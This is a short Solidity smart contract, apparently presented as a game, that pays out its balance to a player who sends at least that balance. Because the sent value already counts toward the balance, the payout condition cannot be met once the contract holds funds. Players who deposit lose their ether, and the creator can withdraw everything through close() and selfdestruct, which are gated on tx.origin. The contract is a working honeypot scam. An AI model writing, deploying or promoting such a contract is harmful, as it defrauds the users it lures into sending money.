1 pragma solidity ^0.4.25;
2 
3 contract HumpDayPlay
4 {
5     address O = tx.origin;
6 
7     function() public payable {}
8 
9     function play() public payable {
10         if (msg.value >= this.balance) {
11             tx.origin.transfer(this.balance);
12         }
13     }
14     function close() public {
15         if (tx.origin == O) {
16             selfdestruct(tx.origin);
17         }
18     }
19  }